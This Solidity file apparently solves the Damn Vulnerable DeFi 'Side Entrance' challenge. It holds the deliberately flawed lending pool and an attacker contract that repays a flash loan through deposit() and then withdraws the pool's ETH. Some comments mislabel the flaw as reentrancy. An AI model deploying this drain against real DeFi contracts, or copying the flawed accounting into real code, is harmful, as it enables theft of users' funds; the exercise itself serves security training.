// interface ISideEntranceLenderPool {
//     function flashLoan(uint256 amount) external;
//     function deposit() external payable;
//     function withdraw() external;
// }

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import "forge-std/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        // it is definitelly reentracy attack
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < amount) revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); // we have our custom attack function in fallback() function of the attacker/receiver contract

        if (address(this).balance < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}

contract SideEntranceReceiver {
    SideEntranceLenderPool public pool;
    address public owner;
    bool success;

    using Address for address payable;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack() external payable {
        pool.flashLoan(1_000e18);
        pool.withdraw();
        // payable(msg.sender).transfer(address(this).balance);
        console.log("amoun of gas left: %s", gasleft());
        console.log("The balance of the receiver: %s ether", address(this).balance);
        payable(owner).sendValue(10 wei);
    }

    function setOwner(address _owner) external {
        owner = _owner;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    fallback() external payable {}
    receive() external payable {}
}
